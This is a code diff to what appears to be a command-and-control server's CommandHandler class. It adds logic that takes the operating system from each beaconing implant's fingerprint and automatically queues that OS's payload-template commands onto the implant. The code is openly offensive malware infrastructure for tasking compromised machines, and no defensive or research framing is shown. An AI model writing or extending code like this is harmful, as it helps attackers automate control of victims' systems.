@@ -14,6 +14,7 @@ from datetime import datetime
 import structlog
 from core.crypto import AdaptiveCrypto
 import sqlite3  # From global DB_CONN
+from config.payloads import validate_template
 
 logger = structlog.get_logger()
 
@@ -86,6 +87,20 @@ class CommandHandler:
                 self.redis.setex(f"implant:{implant_id}", 3600, json.dumps(self.implants_cache[implant_id]))
             
             logger.info(f"Beacon processed: {implant_id}", ip=addr[0])
+            
+            # --- Auto-queue commands from payload template ---
+            platform_val = decrypted.get('fingerprint', {}).get('os')  # Expecting 'os' from fingerprint.py
+            template_key = f"{platform_val.lower()}_static" if platform_val else None
+
+            if template_key:
+                try:
+                    template = validate_template(template_key)
+                    commands = template.get('commands', [])
+                    for cmd in commands:
+                        task_id = await self.queue_command(implant_id, cmd)
+                        logger.info("Auto-command queued from payload template", command=cmd, task_id=task_id)
+                except Exception as e:
+                    logger.warning("Failed to apply payload template during beacon", error=str(e), template_key=template_key)
             
             # Pending tasks from DB
             cursor.execute("SELECT id, command, args FROM tasks WHERE implant_id=? AND status='queued' ORDER BY created_at LIMIT 1", (implant_id,))
